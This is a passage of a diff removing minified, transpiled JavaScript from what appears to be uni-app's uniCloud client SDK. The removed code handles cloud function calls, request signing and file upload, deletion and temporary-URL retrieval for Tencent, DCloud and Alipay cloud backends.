-          try {
-            n = i ? JSON.stringify(i) : "";
-          } catch (r) {
-            return Promise.reject(r);
-          }
-          if (!r) return Promise.reject(new ge({
-            code: "PARAM_ERROR",
-            message: "\u51FD\u6570\u540D\u4E0D\u80FD\u4E3A\u7A7A"
-          }));
-          var l = {
-            inQuery: o,
-            parse: a,
-            search: s,
-            function_name: r,
-            request_data: n
-          };
-          return ht(this.config.env).send("functions.invokeFunction", l, {
-            timeout: u
-          }).then(function (e) {
-            if (e.code) c(null, e);else {
-              var t = e.data.response_data;
-              if (a) c(null, {
-                result: t,
-                requestId: e.requestId
-              });else try {
-                t = JSON.parse(e.data.response_data), c(null, {
-                  result: t,
-                  requestId: e.requestId
-                });
-              } catch (e) {
-                c(new ge({
-                  message: "response data must be json"
-                }));
-              }
-            }
-            return c.promise;
-          }).catch(function (e) {
-            c(e);
-          }), c.promise;
-        },
-        At = {
-          timeout: 15000,
-          persistence: "session"
-        },
-        It = {},
-        Ct = function () {
-          function e(t) {
-            (0, v.default)(this, e), this.config = t || this.config, this.authObj = void 0;
-          }
-          return (0, m.default)(e, [{
-            key: "init",
-            value: function (t) {
-              switch (Fe.adapter || (this.requestClient = new Fe.adapter.reqClass({
-                timeout: t.timeout || 5000,
-                timeoutMsg: "\u8BF7\u6C42\u5728".concat((t.timeout || 5000) / 1000, "s\u5185\u672A\u5B8C\u6210\uFF0C\u5DF2\u4E2D\u65AD")
-              })), this.config = x(x({}, At), t), !0) {
-                case this.config.timeout > 600000:
-                  console.warn("timeout\u5927\u4E8E\u53EF\u914D\u7F6E\u4E0A\u9650[10\u5206\u949F]\uFF0C\u5DF2\u91CD\u7F6E\u4E3A\u4E0A\u9650\u6570\u503C"), this.config.timeout = 600000;
-                  break;
-                case this.config.timeout < 100:
-                  console.warn("timeout\u5C0F\u4E8E\u53EF\u914D\u7F6E\u4E0B\u9650[100ms]\uFF0C\u5DF2\u91CD\u7F6E\u4E3A\u4E0B\u9650\u6570\u503C"), this.config.timeout = 100;
-              }
-              return new e(this.config);
-            }
-          }, {
-            key: "auth",
-            value: function () {
-              var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
-                t = e.persistence;
-              if (this.authObj) return this.authObj;
-              var n,
-                r = t || Fe.adapter.primaryStorage || At.persistence;
-              return r !== this.config.persistence && (this.config.persistence = r), function (e) {
-                var t = e.env;
-                He[t] = new ze(e), Ye[t] = new ze(x(x({}, e), {}, {
-                  persistence: "local"
-                }));
-              }(this.config), n = this.config, dt[n.env] = new ft(n), this.authObj = new bt(this.config), this.authObj;
-            }
-          }, {
-            key: "on",
-            value: function (e, t) {
-              return Ke.apply(this, [e, t]);
-            }
-          }, {
-            key: "off",
-            value: function (e, t) {
-              return Qe.apply(this, [e, t]);
-            }
-          }, {
-            key: "callFunction",
-            value: function (e, t) {
-              return Pt.apply(this, [e, t]);
-            }
-          }, {
-            key: "deleteFile",
-            value: function (e, t) {
-              return St.apply(this, [e, t]);
-            }
-          }, {
-            key: "getTempFileURL",
-            value: function (e, t) {
-              return Ot.apply(this, [e, t]);
-            }
-          }, {
-            key: "downloadFile",
-            value: function (e, t) {
-              return Tt.apply(this, [e, t]);
-            }
-          }, {
-            key: "uploadFile",
-            value: function (e, t) {
-              return xt.apply(this, [e, t]);
-            }
-          }, {
-            key: "getUploadMetadata",
-            value: function (e, t) {
-              return kt.apply(this, [e, t]);
-            }
-          }, {
-            key: "registerExtension",
-            value: function (e) {
-              It[e.name] = e;
-            }
-          }, {
-            key: "invokeExtension",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e(t, n) {
-                var r;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      if (r = It[t], r) {
-                        e.next = 3;
-                        break;
-                      }
-                      throw new ge({
-                        message: "\u6269\u5C55".concat(t, " \u5FC5\u987B\u5148\u6CE8\u518C")
-                      });
-                    case 3:
-                      return e.next = 5, r.invoke(n, this);
-                    case 5:
-                      return e.abrupt("return", e.sent);
-                    case 6:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function (t, n) {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "useAdapters",
-            value: function (e) {
-              var t = function (e) {
-                  var t,
-                    n,
-                    r = (t = e, "[object Array]" === Object.prototype.toString.call(t) ? e : [e]),
-                    i = y(r);
-                  try {
-                    for (i.s(); !(n = i.n()).done;) {
-                      var o = n.value,
-                        a = o.isMatch,
-                        s = o.genAdapter,
-                        u = o.runtime;
-                      if (a()) return {
-                        adapter: s(),
-                        runtime: u
-                      };
-                    }
-                  } catch (c) {
-                    i.e(c);
-                  } finally {
-                    i.f();
-                  }
-                }(e) || {},
-                n = t.adapter,
-                r = t.runtime;
-              n && (Fe.adapter = n), r && (Fe.runtime = r);
-            }
-          }]), e;
-        }(),
-        Et = new Ct();
-      function Lt(e, t, n) {
-        void 0 === n && (n = {});
-        var r = /\?/.test(t),
-          i = "";
-        for (var o in n) "" === i ? !r && (t += "?") : i += "&", i += o + "=" + encodeURIComponent(n[o]);
-        return /^http(s)?:\/\//.test(t += i) ? t : "" + e + t;
-      }
-      var Mt = function () {
-          function e() {
-            (0, v.default)(this, e);
-          }
-          return (0, m.default)(e, [{
-            key: "get",
-            value: function (e) {
-              var t = e.url,
-                n = e.data,
-                r = e.headers,
-                i = e.timeout;
-              return new Promise(function (e, o) {
-                _e.request({
-                  url: Lt("https:", t),
-                  data: n,
-                  method: "GET",
-                  header: r,
-                  timeout: i,
-                  success: function (t) {
-                    e(t);
-                  },
-                  fail: function (e) {
-                    o(e);
-                  }
-                });
-              });
-            }
-          }, {
-            key: "post",
-            value: function (e) {
-              var t = e.url,
-                n = e.data,
-                r = e.headers,
-                i = e.timeout;
-              return new Promise(function (e, o) {
-                _e.request({
-                  url: Lt("https:", t),
-                  data: n,
-                  method: "POST",
-                  header: r,
-                  timeout: i,
-                  success: function (t) {
-                    e(t);
-                  },
-                  fail: function (e) {
-                    o(e);
-                  }
-                });
-              });
-            }
-          }, {
-            key: "upload",
-            value: function (e) {
-              return new Promise(function (t, n) {
-                var r = e.url,
-                  i = e.file,
-                  o = e.data,
-                  a = e.headers,
-                  s = e.fileType,
-                  u = _e.uploadFile({
-                    url: Lt("https:", r),
-                    name: "file",
-                    formData: Object.assign({}, o),
-                    filePath: i,
-                    fileType: s,
-                    header: a,
-                    success: function (e) {
-                      var n = {
-                        statusCode: e.statusCode,
-                        data: e.data || {}
-                      };
-                      200 === e.statusCode && o.success_action_status && (n.statusCode = parseInt(o.success_action_status, 10)), t(n);
-                    },
-                    fail: function (e) {
-                      n(new Error(e.errMsg || "uploadFile:fail"));
-                    }
-                  });
-                "function" == typeof e.onUploadProgress && u && "function" == typeof u.onProgressUpdate && u.onProgressUpdate(function (t) {
-                  e.onUploadProgress({
-                    loaded: t.totalBytesSent,
-                    total: t.totalBytesExpectedToSend
-                  });
-                });
-              });
-            }
-          }]), e;
-        }(),
-        Dt = {
-          setItem: function (e, t) {
-            _e.setStorageSync(e, t);
-          },
-          getItem: function (e) {
-            return _e.getStorageSync(e);
-          },
-          removeItem: function (e) {
-            _e.removeStorageSync(e);
-          },
-          clear: function () {
-            _e.clearStorageSync();
-          }
-        },
-        jt = {
-          genAdapter: function () {
-            return {
-              root: {},
-              reqClass: Mt,
-              localStorage: Dt,
-              primaryStorage: "local"
-            };
-          },
-          isMatch: function () {
-            return !0;
-          },
-          runtime: "uni_app"
-        };
-      Et.useAdapters(jt);
-      var Nt = Et,
-        Rt = Nt.init;
-      Nt.init = function (e) {
-        e.env = e.spaceId;
-        var t = Rt.call(this, e);
-        t.config.provider = "tencent", t.config.spaceId = e.spaceId;
-        var n = t.auth;
-        return t.auth = function (e) {
-          var t = n.call(this, e);
-          return ["linkAndRetrieveDataWithTicket", "signInAnonymously", "signOut", "getAccessToken", "getLoginState", "signInWithTicket", "getUserInfo"].forEach(function (e) {
-            var n;
-            t[e] = (n = t[e], function (e) {
-              e = e || {};
-              var t = pe(e),
-                r = t.success,
-                i = t.fail,
-                o = t.complete;
-              if (!(r || i || o)) return n.call(this, e);
-              n.call(this, e).then(function (e) {
-                r && r(e), o && o(e);
-              }, function (e) {
-                i && i(e), o && o(e);
-              });
-            }).bind(t);
-          }), t;
-        }, t.customAuth = t.auth, t;
-      };
-      var $t = Nt;
-      function Ft(e, t) {
-        return Ut.apply(this, arguments);
-      }
-      function Ut() {
-        return Ut = (0, l.default)(o.default.mark(function e(t, n) {
-          var r, i, a;
-          return o.default.wrap(function (e) {
-            while (1) switch (e.prev = e.next) {
-              case 0:
-                return r = "http://".concat(t, ":").concat(n, "/system/ping"), e.prev = 1, e.next = 4, a = {
-                  url: r,
-                  timeout: 500
-                }, new Promise(function (e, t) {
-                  _e.request(x(x({}, a), {}, {
-                    success: function (t) {
-                      e(t);
-                    },
-                    fail: function (e) {
-                      t(e);
-                    }
-                  }));
-                });
-              case 4:
-                return i = e.sent, e.abrupt("return", !(!i.data || 0 !== i.data.code));
-              case 8:
-                return e.prev = 8, e.t0 = e["catch"](1), e.abrupt("return", !1);
-              case 11:
-              case "end":
-                return e.stop();
-            }
-          }, e, null, [[1, 8]]);
-        })), Ut.apply(this, arguments);
-      }
-      function Bt(e, t) {
-        return qt.apply(this, arguments);
-      }
-      function qt() {
-        return qt = (0, l.default)(o.default.mark(function e(t, n) {
-          var r, i, a;
-          return o.default.wrap(function (e) {
-            while (1) switch (e.prev = e.next) {
-              case 0:
-                i = 0;
-              case 1:
-                if (!(i < t.length)) {
-                  e.next = 11;
-                  break;
-                }
-                return a = t[i], e.next = 5, Ft(a, n);
-              case 5:
-                if (!e.sent) {
-                  e.next = 8;
-                  break;
-                }
-                return r = a, e.abrupt("break", 11);
-              case 8:
-                i++, e.next = 1;
-                break;
-              case 11:
-                return e.abrupt("return", {
-                  address: r,
-                  port: n
-                });
-              case 12:
-              case "end":
-                return e.stop();
-            }
-          }, e);
-        })), qt.apply(this, arguments);
-      }
-      var zt = {
-          "serverless.file.resource.generateProximalSign": "storage/generate-proximal-sign",
-          "serverless.file.resource.report": "storage/report",
-          "serverless.file.resource.delete": "storage/delete",
-          "serverless.file.resource.getTempFileURL": "storage/get-temp-file-url"
-        },
-        Ht = function () {
-          function e(t) {
-            if ((0, v.default)(this, e), ["spaceId", "clientSecret"].forEach(function (e) {
-              if (!Object.prototype.hasOwnProperty.call(t, e)) throw new Error("".concat(e, " required"));
-            }), !t.endpoint) throw new Error("\u96C6\u7FA4\u7A7A\u95F4\u672A\u914D\u7F6EApiEndpoint\uFF0C\u914D\u7F6E\u540E\u9700\u8981\u91CD\u65B0\u5173\u8054\u670D\u52A1\u7A7A\u95F4\u540E\u751F\u6548");
-            this.config = Object.assign({}, t), this.config.provider = "dcloud", this.config.requestUrl = this.config.endpoint + "/client", this.config.envType = this.config.envType || "public", this.adapter = _e;
-          }
-          return (0, m.default)(e, [{
-            key: "request",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e(t) {
-                var n,
-                  r = this,
-                  i = arguments;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      if (!(i.length > 1 && void 0 !== i[1]) || i[1], n = !1, !n) {
-                        e.next = 8;
-                        break;
-                      }
-                      return e.next = 5, this.setupLocalRequest(t);
-                    case 5:
-                      e.t0 = e.sent, e.next = 9;
-                      break;
-                    case 8:
-                      e.t0 = this.setupRequest(t);
-                    case 9:
-                      return t = e.t0, e.abrupt("return", Promise.resolve().then(function () {
-                        return n ? r.requestLocal(t) : Oe.wrappedRequest(t, r.adapter.request);
-                      }));
-                    case 11:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function (t) {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "requestLocal",
-            value: function (e) {
-              var t = this;
-              return new Promise(function (n, r) {
-                t.adapter.request(Object.assign(e, {
-                  complete: function (e) {
-                    if (e || (e = {}), !e.statusCode || e.statusCode >= 400) {
-                      var t = e.data && e.data.code || "SYS_ERR",
-                        i = e.data && e.data.message || "request:fail";
-                      return r(new ge({
-                        code: t,
-                        message: i
-                      }));
-                    }
-                    n({
-                      success: !0,
-                      result: e.data
-                    });
-                  }
-                }));
-              });
-            }
-          }, {
-            key: "setupRequest",
-            value: function (e) {
-              var t = Object.assign({}, e, {
-                  spaceId: this.config.spaceId,
-                  timestamp: Date.now()
-                }),
-                n = {
-                  "Content-Type": "application/json"
-                };
-              n["x-serverless-sign"] = Oe.sign(t, this.config.clientSecret);
-              var r = ke();
-              n["x-client-info"] = encodeURIComponent(JSON.stringify(r));
-              var i = ye(),
-                o = i.token;
-              return n["x-client-token"] = o, {
-                url: this.config.requestUrl,
-                method: "POST",
-                data: t,
-                dataType: "json",
-                header: JSON.parse(JSON.stringify(n))
-              };
-            }
-          }, {
-            key: "setupLocalRequest",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e(t) {
-                var n, r, i, a, s, u, c, l, f;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return n = ke(), r = ye(), i = r.token, a = Object.assign({}, t, {
-                        spaceId: this.config.spaceId,
-                        timestamp: Date.now(),
-                        clientInfo: n,
-                        token: i
-                      }), s = this.__dev__ && this.__dev__.debugInfo || {}, u = s.address, c = s.servePort, e.next = 9, Bt(u, c);
-                    case 9:
-                      return l = e.sent, f = l.address, e.abrupt("return", {
-                        url: "http://".concat(f, ":").concat(c, "/").concat(zt[t.method]),
-                        method: "POST",
-                        data: a,
-                        dataType: "json",
-                        header: JSON.parse(JSON.stringify({
-                          "Content-Type": "application/json"
-                        }))
-                      });
-                    case 12:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function (t) {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "callFunction",
-            value: function (e) {
-              var t = {
-                method: "serverless.function.runtime.invoke",
-                params: JSON.stringify({
-                  functionTarget: e.name,
-                  functionArgs: e.data || {}
-                })
-              };
-              return this.request(t, !1);
-            }
-          }, {
-            key: "getUploadFileOptions",
-            value: function (e) {
-              var t = {
-                method: "serverless.file.resource.generateProximalSign",
-                params: JSON.stringify(e)
-              };
-              return this.request(t);
-            }
-          }, {
-            key: "reportUploadFile",
-            value: function (e) {
-              var t = {
-                method: "serverless.file.resource.report",
-                params: JSON.stringify(e)
-              };
-              return this.request(t);
-            }
-          }, {
-            key: "uploadFile",
-            value: function (e) {
-              var t,
-                n = this,
-                r = e.filePath,
-                i = e.cloudPath,
-                o = e.fileType,
-                a = void 0 === o ? "image" : o,
-                s = e.onUploadProgress;
-              if (!i) throw new ge({
-                code: "CLOUDPATH_REQUIRED",
-                message: "cloudPath\u4E0D\u53EF\u4E3A\u7A7A"
-              });
-              return this.getUploadFileOptions({
-                cloudPath: i
-              }).then(function (e) {
-                var i = e.result,
-                  o = i.url,
-                  u = i.formData,
-                  c = i.name;
-                return t = e.result.fileUrl, new Promise(function (e, t) {
-                  var i = n.adapter.uploadFile({
-                    url: o,
-                    formData: u,
-                    name: c,
-                    filePath: r,
-                    fileType: a,
-                    success: function (n) {
-                      n && n.statusCode < 400 ? e(n) : t(new ge({
-                        code: "UPLOAD_FAILED",
-                        message: "\u6587\u4EF6\u4E0A\u4F20\u5931\u8D25"
-                      }));
-                    },
-                    fail: function (e) {
-                      t(new ge({
-                        code: e.code || "UPLOAD_FAILED",
-                        message: e.message || e.errMsg || "\u6587\u4EF6\u4E0A\u4F20\u5931\u8D25"
-                      }));
-                    }
-                  });
-                  "function" == typeof s && i && "function" == typeof i.onProgressUpdate && i.onProgressUpdate(function (e) {
-                    s({
-                      loaded: e.totalBytesSent,
-                      total: e.totalBytesExpectedToSend
-                    });
-                  });
-                });
-              }).then(function () {
-                return n.reportUploadFile({
-                  cloudPath: i
-                });
-              }).then(function (e) {
-                return new Promise(function (n, i) {
-                  e.success ? n({
-                    success: !0,
-                    filePath: r,
-                    fileID: t
-                  }) : i(new ge({
-                    code: "UPLOAD_FAILED",
-                    message: "\u6587\u4EF6\u4E0A\u4F20\u5931\u8D25"
-                  }));
-                });
-              });
-            }
-          }, {
-            key: "deleteFile",
-            value: function (e) {
-              var t = e.fileList,
-                n = {
-                  method: "serverless.file.resource.delete",
-                  params: JSON.stringify({
-                    fileList: t
-                  })
-                };
-              return this.request(n).then(function (e) {
-                if (e.success) return e.result;
-                throw new ge({
-                  code: "DELETE_FILE_FAILED",
-                  message: "\u5220\u9664\u6587\u4EF6\u5931\u8D25"
-                });
-              });
-            }
-          }, {
-            key: "getTempFileURL",
-            value: function () {
-              var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
-                t = e.fileList,
-                n = e.maxAge;
-              if (!Array.isArray(t) || 0 === t.length) throw new ge({
-                code: "INVALID_PARAM",
-                message: "fileList\u7684\u5143\u7D20\u5FC5\u987B\u662F\u975E\u7A7A\u7684\u5B57\u7B26\u4E32"
-              });
-              var r = {
-                method: "serverless.file.resource.getTempFileURL",
-                params: JSON.stringify({
-                  fileList: t,
-                  maxAge: n
-                })
-              };
-              return this.request(r).then(function (e) {
-                if (e.success) return {
-                  fileList: e.result.fileList.map(function (e) {
-                    return {
-                      fileID: e.fileID,
-                      tempFileURL: e.tempFileURL
-                    };
-                  })
-                };
-                throw new ge({
-                  code: "GET_TEMP_FILE_URL_FAILED",
-                  message: "\u83B7\u53D6\u4E34\u65F6\u6587\u4EF6\u94FE\u63A5\u5931\u8D25"
-                });
-              });
-            }
-          }]), e;
-        }(),
-        Yt = {
-          init: function (e) {
-            var t = new Ht(e),
-              n = {
-                signInAnonymously: function () {
-                  return Promise.resolve();
-                },
-                getLoginState: function () {
-                  return Promise.resolve(!1);
-                }
-              };
-            return t.auth = function () {
-              return n;
-            }, t.customAuth = t.auth, t;
-          }
-        },
-        Jt = S(function (e, t) {
-          e.exports = T.enc.Hex;
-        });
-      function Vt() {
-        return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (e) {
-          var t = 16 * Math.random() | 0;
-          return ("x" === e ? t : 3 & t | 8).toString(16);
-        });
-      }
-      function Zt() {
-        var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "",
-          t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {},
-          n = t.data,
-          r = t.functionName,
-          i = t.method,
-          o = t.headers,
-          a = t.signHeaderKeys,
-          u = void 0 === a ? [] : a,
-          c = t.config,
-          l = String(Date.now()),
-          f = Vt(),
-          d = Object.assign({}, o, {
-            "x-from-app-id": c.spaceAppId,
-            "x-from-env-id": c.spaceId,
-            "x-to-env-id": c.spaceId,
-            "x-from-instance-id": l,
-            "x-from-function-name": r,
-            "x-client-timestamp": l,
-            "x-alipay-source": "client",
-            "x-request-id": f,
-            "x-alipay-callid": f,
-            "x-trace-id": f
-          }),
-          h = ["x-from-app-id", "x-from-env-id", "x-to-env-id", "x-from-instance-id", "x-from-function-name", "x-client-timestamp"].concat(u),
-          p = e.split("?") || [],
-          g = (0, s.default)(p, 2),
-          v = g[0],
-          m = void 0 === v ? "" : v,
-          _ = g[1],
-          y = void 0 === _ ? "" : _,
-          w = function (e) {
-            var t = "HMAC-SHA256",
-              n = e.signedHeaders.join(";"),
-              r = e.signedHeaders.map(function (t) {
-                return "".concat(t.toLowerCase(), ":").concat(e.headers[t], "\n");
-              }).join(""),
-              i = Le(e.body).toString(Jt),
-              o = "".concat(e.method.toUpperCase(), "\n").concat(e.path, "\n").concat(e.query, "\n").concat(r, "\n").concat(n, "\n").concat(i, "\n"),
-              a = Le(o).toString(Jt),
-              s = "".concat(t, "\n").concat(e.timestamp, "\n").concat(a, "\n"),
-              u = Me(s, e.secretKey).toString(Jt);
-            return "".concat(t, " Credential=").concat(e.secretId, ", SignedHeaders=").concat(n, ", Signature=").concat(u);
-          }({
-            path: m,
-            query: y,
-            method: i,
-            headers: d,
-            timestamp: l,
-            body: JSON.stringify(n),
-            secretId: c.accessKey,
-            secretKey: c.secretKey,
-            signedHeaders: h.sort()
-          });
-        return {
-          url: "".concat(c.endpoint).concat(e),
-          headers: Object.assign({}, d, {
-            Authorization: w
-          })
-        };
-      }
-      function Wt(e) {
-        var t = e.url,
-          n = e.data,
-          r = e.method,
-          i = void 0 === r ? "POST" : r,
-          o = e.headers,
-          a = void 0 === o ? {} : o,
-          s = e.timeout;
-        return new Promise(function (e, r) {
-          _e.request({
-            url: t,
-            method: i,
-            data: "object" == (0, u.default)(n) ? JSON.stringify(n) : n,
-            header: a,
-            dataType: "json",
-            timeout: s,
-            complete: function () {
-              var t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
-                n = a["x-trace-id"] || "";
-              if (!t.statusCode || t.statusCode >= 400) {
-                var i = t.data || {},
-                  o = i.message,
-                  s = i.errMsg,
-                  u = i.trace_id;
-                return r(new ge({
-                  code: "SYS_ERR",
-                  message: o || s || "request:fail",
-                  requestId: u || n
-                }));
-              }
-              e({
-                status: t.statusCode,
-                data: t.data,
-                headers: t.header,
-                requestId: n
-              });
-            }
-          });
-        });
-      }
-      function Kt(e, t) {
-        var n = e.path,
-          r = e.data,
-          i = e.method,
-          o = void 0 === i ? "GET" : i,
-          a = Zt(n, {
-            functionName: "",
-            data: r,
-            method: o,
-            headers: {
-              "x-alipay-cloud-mode": "oss",
-              "x-data-api-type": "oss",
-              "x-expire-timestamp": Date.now() + 60000
-            },
-            signHeaderKeys: ["x-data-api-type", "x-expire-timestamp"],
-            config: t
-          }),
-          s = a.url,
-          u = a.headers;
-        return Wt({
-          url: s,
-          data: r,
-          method: o,
-          headers: u
-        }).then(function (e) {
-          var t = e.data || {};
-          if (!t.success) throw new ge({
-            code: e.errCode,
-            message: e.errMsg,
-            requestId: e.requestId
-          });
-          return t.data || {};
-        }).catch(function (e) {
-          throw new ge({
-            code: e.errCode,
-            message: e.errMsg,
-            requestId: e.requestId
-          });
-        });
-      }
-      function Gt() {
-        var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "",
-          t = e.trim().replace(/^cloud:\/\//, ""),
-          n = t.indexOf("/");
-        if (n <= 0) throw new ge({
-          code: "INVALID_PARAM",
-          message: "fileID\u4E0D\u5408\u6CD5"
-        });
-        var r = t.substring(0, n),
-          i = t.substring(n + 1);
-        return r !== this.config.spaceId && console.warn("file ".concat(e, " does not belong to env ").concat(this.config.spaceId)), i;
-      }
-      function Qt() {
-        var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "";
-        return "cloud://".concat(this.config.spaceId, "/").concat(e.replace(/^\/+/, ""));
-      }
-      var Xt = function () {
-          function e(t) {
-            (0, v.default)(this, e), this.config = t;
-          }
-          return (0, m.default)(e, [{
-            key: "signedURL",
-            value: function (e) {
-              var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {},
-                n = "/ws/function/".concat(e),
-                r = this.config.wsEndpoint.replace(/^ws(s)?:\/\//, ""),
-                i = Object.assign({}, t, {
-                  accessKeyId: this.config.accessKey,
-                  signatureNonce: Vt(),
-                  timestamp: "" + Date.now()
-                }),
-                o = [n, ["accessKeyId", "authorization", "signatureNonce", "timestamp"].sort().map(function (e) {
-                  return i[e] ? "".concat(e, "=").concat(i[e]) : null;
-                }).filter(Boolean).join("&"), "host:".concat(r)].join("\n"),
-                a = ["HMAC-SHA256", Le(o).toString(Jt)].join("\n"),
-                s = Me(a, this.config.secretKey).toString(Jt),
-                u = Object.keys(i).map(function (e) {
-                  return "".concat(e, "=").concat(encodeURIComponent(i[e]));
-                }).join("&");
-              return "".concat(this.config.wsEndpoint).concat(n, "?").concat(u, "&signature=").concat(s);
-            }
-          }]), e;
-        }(),
-        en = function () {
-          function e(t) {
-            if ((0, v.default)(this, e), ["spaceId", "spaceAppId", "accessKey", "secretKey"].forEach(function (e) {
-              if (!Object.prototype.hasOwnProperty.call(t, e)) throw new Error("".concat(e, " required"));
-            }), t.endpoint) {
-              if ("string" != typeof t.endpoint) throw new Error("endpoint must be string");
-              if (!/^https:\/\//.test(t.endpoint)) throw new Error("endpoint must start with https://");
-              t.endpoint = t.endpoint.replace(/\/$/, "");
-            }
-            this.config = Object.assign({}, t, {
-              endpoint: t.endpoint || "https://".concat(t.spaceId, ".api-hz.cloudbasefunction.cn"),
-              wsEndpoint: t.wsEndpoint || "wss://".concat(t.spaceId, ".api-hz.cloudbasefunction.cn")
-            }), this._websocket = new Xt(this.config);
-          }
-          return (0, m.default)(e, [{
-            key: "callFunction",
-            value: function (e) {
-              return function (e, t) {
-                var n = e.name,
-                  r = e.data,
-                  i = e.async,
-                  o = void 0 !== i && i,
-                  a = e.timeout,
-                  s = "POST",
-                  u = {
-                    "x-to-function-name": n
-                  };
-                o && (u["x-function-invoke-type"] = "async");
-                var c = Zt("/functions/invokeFunction", {
-                    functionName: n,
-                    data: r,
-                    method: s,
-                    headers: u,
-                    signHeaderKeys: ["x-to-function-name"],
-                    config: t
-                  }),
-                  l = c.url,
-                  f = c.headers;
-                return Wt({
-                  url: l,
-                  data: r,
-                  method: s,
-                  headers: f,
-                  timeout: a
-                }).then(function (e) {
-                  var t = 0;
-                  if (o) {
-                    var n = e.data || {};
-                    t = "200" === n.errCode ? 0 : n.errCode, e.data = n.data || {}, e.errMsg = n.errMsg;
-                  }
-                  if (0 !== t) throw new ge({
-                    code: t,
-                    message: e.errMsg,
-                    requestId: e.requestId
-                  });
-                  return {
-                    errCode: t,
-                    success: 0 === t,
-                    requestId: e.requestId,
-                    result: e.data
-                  };
-                }).catch(function (e) {
-                  throw new ge({
-                    code: e.errCode,
-                    message: e.errMsg,
-                    requestId: e.requestId
-                  });
-                });
-              }(e, this.config);
-            }
-          }, {
-            key: "uploadFileToOSS",
-            value: function (e) {
-              var t = e.url,
-                n = e.filePath,
-                r = e.fileType,
-                i = e.formData,
-                o = e.onUploadProgress;
-              return new Promise(function (e, a) {
-                var s = _e.uploadFile({
-                  url: t,
-                  filePath: n,
-                  fileType: r,
-                  formData: i,
-                  name: "file",
-                  success: function (t) {
-                    t && t.statusCode < 400 ? e(t) : a(new ge({
-                      code: "UPLOAD_FAILED",
-                      message: "\u6587\u4EF6\u4E0A\u4F20\u5931\u8D25"
-                    }));
-                  },
-                  fail: function (e) {
-                    a(new ge({
-                      code: e.code || "UPLOAD_FAILED",
-                      message: e.message || e.errMsg || "\u6587\u4EF6\u4E0A\u4F20\u5931\u8D25"
-                    }));
-                  }
-                });
-                "function" == typeof o && s && "function" == typeof s.onProgressUpdate && s.onProgressUpdate(function (e) {
-                  o({
-                    loaded: e.totalBytesSent,
-                    total: e.totalBytesExpectedToSend
-                  });
-                });
-              });
-            }
-          }, {
-            key: "uploadFile",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e(t) {
-                var n, r, i, a, s, u, c, l, f, d, h;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      if (n = t.filePath, r = t.cloudPath, i = void 0 === r ? "" : r, a = t.fileType, s = void 0 === a ? "image" : a, u = t.onUploadProgress, "string" === N(i)) {
-                        e.next = 3;
-                        break;
-                      }
-                      throw new ge({
-                        code: "INVALID_PARAM",
-                        message: "cloudPath\u5FC5\u987B\u4E3A\u5B57\u7B26\u4E32\u7C7B\u578B"
-                      });
-                    case 3:
-                      if (i = i.trim()) {
-                        e.next = 5;
-                        break;
-                      }
-                      throw new ge({
-                        code: "INVALID_PARAM",
-                        message: "cloudPath\u4E0D\u53EF\u4E3A\u7A7A"
-                      });
-                    case 5:
-                      if (!/:\/\//.test(i)) {
-                        e.next = 7;
-                        break;
-                      }
-                      throw new ge({
-                        code: "INVALID_PARAM",
-                        message: "cloudPath\u4E0D\u5408\u6CD5"
-                      });
-                    case 7:
-                      return e.next = 9, Kt({
-                        path: "/".concat(i.replace(/^\//, ""), "?post_url")
-                      }, this.config);
-                    case 9:
-                      return c = e.sent, l = c.file_id, f = c.upload_url, d = c.form_data, h = d && d.reduce(function (e, t) {
-                        return e[t.key] = t.value, e;
-                      }, {}), e.abrupt("return", this.uploadFileToOSS({
-                        url: f,
-                        filePath: n,
-                        fileType: s,
-                        formData: h,
-                        onUploadProgress: u
-                      }).then(function () {
-                        return {
-                          fileID: l
-                        };
-                      }));
-                    case 15:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function (t) {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "getTempFileURL",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e(t) {
-                var n,
-                  r = this;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return n = t.fileList, e.abrupt("return", new Promise(function (e, t) {
-                        (!n || n.length < 0) && e({
-                          code: "INVALID_PARAM",
-                          message: "fileList\u4E0D\u80FD\u4E3A\u7A7A\u6570\u7EC4"
-                        }), n.length > 50 && e({
-                          code: "INVALID_PARAM",
-                          message: "fileList\u6570\u7EC4\u957F\u5EA6\u4E0D\u80FD\u8D85\u8FC750"
-                        });
-                        var i,
-                          o = [],
-                          a = y(n);
-                        try {
-                          for (a.s(); !(i = a.n()).done;) {
-                            var s = i.value,
-                              u = void 0;
-                            "string" !== N(s) && e({
-                              code: "INVALID_PARAM",
-                              message: "fileList\u7684\u5143\u7D20\u5FC5\u987B\u662F\u975E\u7A7A\u7684\u5B57\u7B26\u4E32"
-                            });
-                            try {
-                              u = Gt.call(r, s);
-                            } catch (e) {
-                              console.warn(e.errCode, e.errMsg), u = s;
-                            }
-                            o.push({
-                              file_id: u,
-                              expire: 600
-                            });
-                          }
-                        } catch (c) {
